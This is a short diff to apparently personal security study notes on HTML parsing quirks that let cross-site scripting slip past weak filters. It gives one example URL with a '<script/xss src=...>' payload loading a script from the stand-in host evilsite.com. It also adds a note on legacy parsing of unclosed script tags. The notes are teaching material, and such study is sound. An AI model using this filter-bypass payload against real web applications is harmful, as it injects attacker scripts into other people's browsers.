@@ -74,4 +74,7 @@ Parsing
 	Example:
 		You can go to https://example.com/vulnerable?name=<script/xss%20src=http://evilsite.com/my.js> and it generates
 		![[Pasted image 20240325211333.png]]
-		A bad XSS filter on the web application may not see that as a script tag due to it being a 'script/xss' tag. But Firefox's HTML parser, for instance 
+		A bad XSS filter on the web application may not see that as a script tag due to it being a 'script/xss' tag. But Firefox's HTML parser, for instance, will treat the slash as whitespace, enabling the attack.
+Legacy Parsing 
+	Due to decades of bad HTML, browsers are quite excellent at cleaning up after authors, and these conditions are often exploitable 
+	- '`<script>` tag on its own will automatically be closed at the end of the page
